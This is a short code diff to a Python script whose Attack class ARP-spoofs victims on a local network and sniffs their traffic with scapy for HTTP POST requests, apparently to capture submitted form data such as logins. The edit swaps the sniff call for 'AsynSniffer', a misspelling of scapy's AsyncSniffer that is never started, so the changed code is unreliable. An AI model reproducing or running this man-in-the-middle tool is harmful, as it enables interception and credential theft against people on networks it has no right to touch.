@@ -68,7 +68,7 @@ class Attack():
     
     def sniff_packets(self):
         for v in self.victim:
-            scapy.sniff(filter='ether mac ' + self.ip_mac[v], prn=self.process_packet, iface=self.interfaces[1], store=False)
+            scapy.AsynSniffer(filter='ether mac ' + self.ip_mac[v], prn=self.process_packet, iface=self.interfaces[1], store=False)
 
     def process_packet(self, packet):
         if packet.haslayer(HTTPRequest) and packet[HTTPRequest].Method.decode() == 'POST':
@@ -83,8 +83,8 @@ for v in attack.victim:
     print('victim: ', v, 'mac: ', attack.ip_mac[v])
 #print(attack.interfaces, attack.ip_list, '\n', attack.ip_mac, '\n', attack.network)
 try:
+    attack.sniff_packets()
     while 1:
         attack.arp_spoofing()
-        attack.sniff_packets()
 except:
     attack.ret_arp_spoofing()
